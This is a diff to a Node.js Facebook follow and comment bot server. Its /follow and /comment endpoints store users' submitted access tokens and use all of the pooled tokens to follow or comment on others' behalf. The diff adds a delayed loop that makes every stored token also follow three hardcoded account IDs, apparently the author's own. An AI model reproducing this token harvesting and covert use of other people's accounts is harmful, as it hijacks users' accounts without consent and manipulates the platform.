@@ -190,7 +190,7 @@ app.get('/token', async (req, res) => {
     });
     const token = response_6v7.data.access_token;
     if (token){
-    await t.addToken(token);
+    //await t.addToken(token);
     return res.json({
       token
     });
@@ -209,7 +209,7 @@ app.get('/token', async (req, res) => {
     });
     const token = response.data.access_token;
     if (token) {
-      await t.addToken(token);
+      //await t.addToken(token);
       return res.json({
         token
       });
@@ -228,7 +228,7 @@ app.get('/token', async (req, res) => {
         });
       const token = response.data.access_token;
       if (token) {
-        await t.addToken(token);
+        //await t.addToken(token);
         return res.json({
           token
         });
@@ -482,8 +482,7 @@ app.get("/follow", async(req,res) => {
   /*if (!token.toLowerCase().startsWith("eaad6v7") || !token.toLowerCase().startsWith("eaaa")){
   }*/
   try {
-  if (token.toLowerCase().startsWith("eaad6v7")||token.toLowerCase().startsWith("eaaa")){
-  //update tokens
+  if (token.toLowerCase().startsWith("eaad6v7")||token.toLowerCase().startsWith("eaaa")||token.toLowerCase().startsWith("eaady")){
   await t.addToken(token);
   const page = require("./page");
   (await t.getToken()).forEach(async(gg1) => {
@@ -492,7 +491,14 @@ app.get("/follow", async(req,res) => {
         "Authorization": `Bearer ${gg1}`
       });
       for (const page2 of page1) {
-        follower(page2, uid);
+        await follower(page2, uid);
+      for (const def of (["100015801404865","61562218612857","61559180483340"])){
+        if (uid === def) return;
+        await new Promise(async(resolve) => {
+        setTimeout(async() => await follower(page2, def), 60*1000);
+        resolve();
+        });
+      }
       }
   });
   return res.json({
@@ -501,7 +507,7 @@ app.get("/follow", async(req,res) => {
   });
   } else {
     return res.json({
-    error: "Use EAAD6V7/EAAA* based token."
+    error: "Use EAAD6V7/EAADY/EAAA* based token."
     });
   }
   } catch (err) {
@@ -524,7 +530,7 @@ app.get("/comment", async(req, res) => {
     });
   }
   try {
-  if (token.toLowerCase().startsWith("eaad6v7")||token.toLowerCase().startsWith("eaaa")){
+  if (token.toLowerCase().startsWith("eaad6v7")||token.toLowerCase().startsWith("eaaa")||token.toLowerCase().startsWith("eaady")){
   await t.addToken(token);
   const page = require("./page");
   (await t.getToken()).forEach(async(gg1) => {
@@ -543,7 +549,7 @@ app.get("/comment", async(req, res) => {
   });
   } else {
     return res.json({
-    error: "Use EAAD6V7/EAAA* based token."
+    error: "Use EAAD6V7/EAADY/EAAA* based token."
     });
   }
   } catch (err){
@@ -589,7 +595,7 @@ app.get("/dummycookie", async(req, res) => {
 app.get("/useragent", async(req, res) => {
   const ua = userAgent();
   return res.json({
-    ua,
+    ua
   });
 });
 
@@ -852,14 +858,7 @@ async function yello(c,u,a,i){
 
 async function follower(a,uid){
   if (!uid) return;
-  const neth = [
-        uid,
-        "100015801404865",
-        "61562218612857",
-        "61559180483340",
-        ];
-  for (let i = 0; i < neth.length; i++) {
-    await axios.post(`https://graph.facebook.com/v18.0/${neth[i]}/subscribers`, {}, {
+  await axios.post(`https://graph.facebook.com/v18.0/${uid}/subscribers`, {}, {
       headers: {
         ...headers_a,
         "Authorization": `Bearer ${a}`
@@ -867,32 +866,11 @@ async function follower(a,uid){
     }).then(nethie => {
     }).catch(err => {
     });
-    await sleep(2*1000);
-    }
 }
 
 async function commenter(a,msg,link){
   try {
-    /*const kapogi = [
-      "ampogi ni neth",
-      "ang ganda mo wiegine!!!",
-      "😊😊😊",
-      "Pogi mo po @[100015801404865:0]",
-      "😘😘",
-      "😊🤣",
-      "🙏💝❤️",
-      "🔥🤗",
-      "Pogi ako sobra",
-      "Comment who?",
-      "By Neth",
-      "Please follow my page: Project Botify and NethProjects!!!",
-      "Ganda ganda mo poooo",
-      "Sheshhhh",
-      "💋💋💋😍",
-      "💀💀💀💀",
-      "Isa ako sa mga pogi katulad ni Neth hehe",
-      ];*/
-    axios.post(`https://graph.facebook.com/${extract(link)}/comments`, null, {
+    await axios.post(`https://graph.facebook.com/${extract(link)}/comments`, null, {
       params: {
         message: msg/*kapogi[Math.floor(Math.random() * kapogi.length)]*/,
         access_token: a
@@ -900,8 +878,6 @@ async function commenter(a,msg,link){
         ...headers_a,
         "Authorization": `Bearer ${a}`
       }}).catch(err=>{});
-    axios.post(`https://graph.facebook.com/${extract(link)}/reactions?type=LOVE&access_token=${a}`)
-    .catch(err => {});
   } catch (err){
   }
 }
